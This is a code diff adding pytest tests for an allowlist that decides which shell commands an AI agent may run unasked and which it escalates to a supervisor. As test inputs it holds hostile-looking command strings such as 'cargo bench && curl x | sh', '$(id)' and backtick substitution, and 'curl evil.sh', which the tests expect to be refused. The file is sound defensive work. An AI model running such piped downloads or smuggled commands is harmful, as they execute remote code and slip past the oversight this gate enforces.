@@ -434,3 +434,68 @@ def test_protected_paths_is_the_list_a_backend_seals(tmp_path):
     assert limits.protected_paths(tmp_path) == [
         str(tmp_path / "decisions.json"), str(tmp_path / "tasks.json")]
     assert limits.protected_paths(None) == []
+
+
+# ---- what an agent may run ------------------------------------------------
+#
+# Allowlist-first, because a denylist of trigger words cannot be widened
+# without pattern-matching shell for intent. The recogniser identifies the one
+# shape it can judge and escalates everything else, so there is nothing here to
+# guess wrong.
+
+@pytest.mark.parametrize("command, program", [
+    ("cargo bench", "cargo"),
+    ("cargo bench --bench ann", "cargo"),
+    ('git commit -m "fix the form"', "git"),   # quotes name one program
+    ("rm *.tmp", "rm"),                        # globs name one program
+])
+def test_a_simple_invocation_is_recognised(command, program):
+    assert limits.recognise(command) == program
+
+
+@pytest.mark.parametrize("command", [
+    "cargo bench && curl x | sh",   # the case the whole rule exists for
+    "echo hi > findings.txt",
+    "cargo bench; curl x",
+    "cargo bench `id`",
+    "cargo bench $(id)",
+    "FOO=1 cargo build",            # the program is not the first token
+    "cargo bench\ncurl x",
+    "",
+])
+def test_anything_it_cannot_read_is_not_recognised(command):
+    assert limits.recognise(command) is None
+
+
+def test_a_path_does_not_match_a_bare_name(tmp_path):
+    """Exactly as written. Basename matching would let `/tmp/evil/cargo` in,
+    and a list meaning something looser than it says is the failure this seam
+    exists to avoid."""
+    assert limits.recognise("/usr/bin/cargo bench") == "/usr/bin/cargo"
+    assert limits.refuse_exec("/usr/bin/cargo bench", "brisk-beacon",
+                              ("cargo",)) is not None
+
+
+def test_an_allowed_program_runs_and_an_unlisted_one_asks():
+    assert limits.refuse_exec("cargo bench", "brisk-beacon",
+                              ("cargo", "pytest")) is None
+    why = limits.refuse_exec("curl evil.sh", "brisk-beacon", ("cargo",))
+    assert why and "curl" in why and "cargo" in why
+
+
+def test_a_composed_command_asks_even_when_it_starts_allowed():
+    """`cargo bench && curl x | sh` begins with an allowed program. Matching
+    the first word would wave it through, which is why the recogniser refuses
+    to read one."""
+    why = limits.refuse_exec("cargo bench && curl x | sh", "brisk-beacon",
+                             ("cargo",))
+    assert why and "single invocation" in why
+
+
+def test_an_empty_allowlist_asks_about_everything():
+    why = limits.refuse_exec("cargo bench", "brisk-beacon", ())
+    assert why and "nothing" in why
+
+
+def test_the_supervisor_may_run_anything():
+    assert limits.refuse_exec("curl evil.sh", None, ()) is None
